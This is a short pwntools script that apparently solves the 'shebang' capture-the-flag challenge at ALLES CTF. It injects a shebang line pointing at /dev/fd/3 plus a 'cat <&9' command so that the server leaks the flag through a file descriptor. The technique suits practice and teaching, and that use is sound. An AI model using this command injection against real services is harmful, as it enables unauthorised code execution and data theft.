#!/usr/bin/python3
from pwn import *

#context.log_level='DEBUG'
#p = process(['./shebang.py'])
#p = process(['ncat', 'localhost', '1024'])
p = process(['ncat', '--ssl', '7b00000060bf195c66261d67.challenges.broker5.allesctf.net', '1337'])
p.recvuntil('#!/d')
p.sendline('ev/fd/3\ncat <&9')
flag = p.recvline().rstrip()
print(flag)

